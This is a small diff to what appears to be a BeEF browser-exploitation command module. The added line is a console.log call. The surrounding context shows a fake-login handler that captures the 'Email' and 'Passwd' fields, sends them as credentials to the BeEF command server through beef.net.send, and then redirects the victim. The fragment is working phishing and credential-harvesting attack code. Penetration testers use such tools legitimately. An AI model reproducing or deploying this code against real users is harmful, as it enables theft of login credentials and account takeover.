@@ -25,6 +25,7 @@ beef.execute(function() {
 function clickedSubmitButton(){
     var credentials = "Username: "+document.getElementById('Email').value+" Password: "+document.getElementById('Passwd').value;
     beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+credentials);
+    console.log(<%= @command_id %>);
     //Timeout needed because otherwise the beef panel doesn't get the credentials in time
     setTimeout("redirect()", <%= @wait_seconds_before_redirect %>);
 }
